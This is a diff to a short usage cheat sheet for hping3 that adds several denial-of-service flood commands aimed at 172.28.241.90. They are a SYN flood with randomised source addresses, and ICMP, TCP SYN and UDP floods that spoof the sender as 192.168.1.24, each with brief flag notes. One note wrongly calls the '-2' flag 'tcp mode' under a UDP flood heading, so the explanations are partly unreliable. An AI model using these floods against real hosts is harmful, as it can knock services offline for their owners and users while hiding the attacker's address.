@@ -6,12 +6,22 @@
 4. Exploit known vulnerabilities of TCP/IP Stacks
 ```
 #Usage
-## Random SRC_IP
+1.## TCP Random SRC_IP
 hping3 -c 1000 -d 120 -S -w 64 -p 22 --flood --rand-source 172.28.241.90
 :-c number of packets
 :-d size of each packet
 :-S SYNC only
 :-w size of Window
 :-p port of Target
+2. ## ICMP Flood from x.x.x.x to y.y.y.y
+hping3 -1 --flood -a 192.168.1.24  172.28.241.90
+: -1 icmp mode
+: -a fake hostname
+3. #3 TCP Sync  
+hping3 -S -a 192.168.1.24 --flood -p 80 172.28.241.90
+: -a fake hostname
+: -p port of Target
 
-
+4. ## UDP Flood from x.x.x.x to y.y.y.y
+hping3 --flood -a 192.168.1.24 -2 -p 6234 172.28.241.90
+: -2 tcp mode
